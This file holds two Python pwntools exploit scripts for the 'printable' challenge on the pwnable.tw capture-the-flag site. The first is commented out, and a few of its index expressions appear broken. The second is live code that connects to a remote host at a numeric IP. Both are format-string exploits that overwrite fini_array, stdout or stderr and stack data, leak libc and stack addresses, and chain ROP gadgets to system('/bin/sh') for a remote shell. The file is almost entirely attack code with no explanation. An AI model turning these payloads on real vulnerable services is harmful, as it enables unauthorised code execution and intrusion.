# #/usr/bin/python3
# from pwn import *
# import time

# local_dbg = 1
# libc = ELF("./libc_64.so.6")
# elf = ELF("./printable")
# context.log_level = "debug"

# # const
# ret_addr = 0x400925 #ret->read->printf->...
# bss_addr = 0x601000
# fini_array_0 = 0x600DB8 #fini_array[0]
# fini_array_1 = 0x600DB8+8 #fini_array[1]
# bss_stdout = 0x601020 # low bytes: 0x2620->0x2540
# libc_csu_fini = elf.symbols["__libc_csu_fini"]
# fini_array_to_bss_offset = bss_addr - fini_array_0
# one_list = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
# print("[*] libc_csu_fini:", hex(libc_csu_fini))
# print("[*] fini_array_to_bss_offset:", hex(fini_array_to_bss_offset))

# def exp():
#     #gdb.attach(p, "b *0x40094d\nc\n")

#     # build ret &
#     # make stdout->stderr struct &
#     # build fake fini_array in bss_start &
#     payload1 = "%{}c%{}$hhn".format(0x25, 16) #stdout_addr[1]
#     payload1 += "%{}c%{}$hhn".format(0x40-0x25, 17) #stdout_addr[0]
#     payload1 += "%{}$hnn".format(18) #bss_start[2]
#     payload1 += "%{}c%{}$hn".format(fini_array_to_bss_offset-0x40-1, 0x2a) #stack ptr
#     payload1 += "%{}c%{}$hn".format(0x925-fini_array_to_bss_offset, 19) #bss_start[0:2]
#     payload1 =  payload1.encode().ljust(0x50, b"\x00")
#     payload1 += p64(bss_stdout+1) #16
#     payload1 += p64(bss_stdout) #17
#     payload1 += p64(bss_addr+2) #18
#     payload1 += p64(bss_addr) #19
#     p.sendafter("Input :", payload1+b"\n\x00")
#     time.sleep(0.5)

#     # leak libc & stack
#     payload2 = "%{}c%{}$hhn".format(0x25, 0x17) # modify printf's ret addr
#     payload2 += "||%{}$p||%{}$p||".format(0x39, 0x3c)
#     payload2 = payload2.encode()
#     p.send(payload2+b"\x00")

#     p.recvuntil(b"||")
#     stack_leak = int(p.recvuntil(b"||", drop=True), 16)
#     libc_leak = int(p.recvuntil(b"||", drop=True), 16)
#     libc_base = libc_leak - 240 - libc.symbols[b"__libc_start_main"]
#     binsh = libc_base + next(libc.search(b"/bin/sh"))
#     system = libc_base + libc.symbols[b"system"]
#     print("[*] stack_leak:", hex(stack_leak))
#     print("[*] libc_leak:", hex(libc_leak))
#     print("[*] libc_base:", hex(libc_base))
#     print("[*] system:", hex(system))
#     print("[*] binsh:", hex(binsh))

#     # ret to system("/bin/sh")
#     ## some gadgets
#     add_rsp_0x80_ret = libc_base + 0x6b4b8
#     stack_printf_ret = stack_leak - 0x290
#     pop_rdi_ret = 0x4009c3
#     print("[*] add_rsp_0x80_ret:", hex(add_rsp_0x80_ret))
#     print("[*] stack_printf_ret:", hex(stack_printf_ret))

#     gadget = add_rsp_0x80_ret
#     gadget_addr_parts = {
#         0 : gadget&0xffff, 
#         1 : (gadget&(0xffff<<16))>>16, 
#         2 : (gadget&(0xffff<<32))>>32
#     }
#     gadget_addr_parts = sorted(gadget_addr_parts.items(), key=lambda x:x[1])
#     print("[*] sorted one_gadget addr parts:")
#     for item in gadget_addr_parts:
#         print(item[0], ":", hex(item[1]))

#     ## gadget part
#     payload3 = "%{}c%{}$hn".format(
#     gadget_addr_parts[0][3], 
#     0x13)
#     ## gadget part
#     payload3 += "%{}c%{}$hn".format(
#     gadget_addr_parts[1][4] - gadget_addr_parts[0][5], 
#     0x14)
#     ## gadget part
#     payload3 += "%{}c%{}$hn".format(
#     gadget_addr_parts[2][6] - gadget_addr_parts[1][7], 
#     0x15)
#     payload3 = payload3.encode().ljust(0x30, b"\x00")
#     ## addrs
#     for item in gadget_addr_parts:
#         payload3 += p64(stack_printf_ret+0x2*item[0]) #0x13-0x15
#     ## rop
#     rop_chain = p64(0x4009c3) + p64(binsh) + p64(system)
#     p.send(payload3 + rop_chain + b"\n\x00")


#     # get shell
#     #cmd = "cat /home/printable/printable_fl4g 1>&2;"
#     p.interactive()
#     action = input("What's next: ")
#     return False if action == "exit" else True

# if __name__ == "__main__":
#     global p
#     while True:
#         #p = process("./printable", env = {"LD_PRELOAD":"./libc_64.so.6"})
#         p = remote("chall.pwnable.tw", 10307)
#         try:
#             ret = exp()
#             if ret == False:
#                 p.close()
#                 break
#             else:
#                 p.close()
#                 continue
#         except:
#             print("ERROR!")
#             p.close()


#!/usr/bin/python
#coding:utf-8

from pwn import *
#context.log_level="debug"
debug=0
#libc=ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
def write_data(s,addr):
    payload=""
    j=0
    count=0x925+3
    i=0
    while(s!=0):
        if (count%0x100 > s&0xff):
            j=0x100-count+s&0xff
        elif count%0x100 == s&0xff:
            continue
        else:
            j=s&0xff-(count%0x100)
        count+=j
        payload+="%"+str(j).rjust(3,"0")+"c"+"%"+str(i+22+2)+"$hhn"
        s>>=8
        i+=1
    length=len(payload)/8
    for i in range(length):
        payload+=p64(bss+i)
    return payload

def write_byte(s,addr):
    count=0x925+3
    if ((count%0x100) > (s&0xff)):
        j=0x100-(count%0x100)+(s&0xff)
    elif count%0x100 == s:
        j=0
    else:
        j=(s&0xff)-(count%0x100)
    payload="%"+str(j).rjust(3,"0")+"c"+"%"+str(17)+"$hhnAAAA"
    payload+=p64(addr)
    return payload
libc=ELF("./libc_64.so.6")
for i in range(160):
    if debug:
        p=process("./printable.bak",env={"LD_PRELOAD":"./libc_64.so.6"})
        #libc=ELF("./libc_64.so.6")
        #gdb.attach(p)
    else:
        p=remote("139.162.123.119",10307)
        #libc=ELF("./libc_64.so.6")

    print(i)
    p.recvuntil("Input :")
    p.send(b"%0584c%42$hnAAA"+b"%1754c%14$n"+b"%0027c%15$hhn"+b"%0256c%16$hn%0021c%17$hhn"+p64(0x601000)+p64(0x601002)+p64(0x601020)+p64(0x601021))
    #sleep(0.1)
    #p.send(("%0064c%9$hn%0069c%10$hhn%p"+p64(0x601020)+p64(0x601021))) 
    p.send("%23$p%32$p%"+str(2313)+"c%23$hhn\x00")
    try:
        s=p.recv(1024,timeout=0.5)
        if s!=null and "Segmentation" not in s:
            stack=int(s[:14],16)
            bss=0x601120
            #stack=bss
            libc_addr=int(s[14:],16)-0x39ff8
            print(hex(stack))
            print(hex(libc_addr))
            #one_gadget=libc_addr+0x4526a
            system=libc_addr+libc.symbols["system"]
            binsh=libc_addr+libc.search("/bin/sh").next()
            prdi=0x00000000004009c3
            prsp=0x00000000004009bd
            flag=0xfbad2887
            stderr=libc_addr+libc.symbols["_IO_2_1_stderr_"]
            for i in range(2):
                p.send(("%"+str(0x925)+"c%23$hhnAAA"+write_byte((flag>>8*i)&0xff,stderr+i)).ljust(0x28,"A")+p64(prdi)+p64(binsh)+p64(system))
            for i in range(1,2):
                p.send(("%"+str(0x925)+"c%23$hhnAAA"+write_byte((flag>>8*i)&0xff,stderr+i)).ljust(0x28,"A")+p64(prdi)+p64(binsh)+p64(system))
            for i in range(6):
                p.send(("%"+str(0x925)+"c%23$hhnAAA"+write_byte((prsp>>8*i)&0xff,stack+8+i)).ljust(0x28,"A")+p64(prdi)+p64(binsh)+p64(system))
                p.recvuntil("AAA")
            '''
            for i in range(3):
                p.sendline("%"+str(0x925)+"c%23$hhnAAA"+write_byte((prdi>>8*i)&0xff,bss+i)+"\x00")
                print p.recv(1024)
            for i in range(6):
                p.sendline("%"+str(0x925)+"c%23$hhnAAA"+write_byte((binsh>>8*i)&0xff,bss+8+i)+"\x00")
                print p.recv(1024)
            for i in range(50):
                p.sendline("%23$p%32$p%"+str(2313)+"c%23$hhn\x00")    
            for j in range(6):
                p.sendline("%"+str(0x925)+"c%23$hhnAAA"+write_byte((system>>8*j)&0xff,bss+0x10+j)+"\x00"*2)
                print p.recv(1024)
            '''
            for i in range(6):
                p.send(("%"+str(0x925)+"c%23$hhnACA"+write_byte(((stack+0x50)>>8*i)&0xff,stack+0x10+i)))
                p.recvuntil("ACA")
            #print p.recv()
            #gdb.attach(p)
            p.sendline("%"+str(0x9dc)+"c%23$hhn\x00")
            p.interactive()
            break
    except:
        pass
    finally:
        p.close()
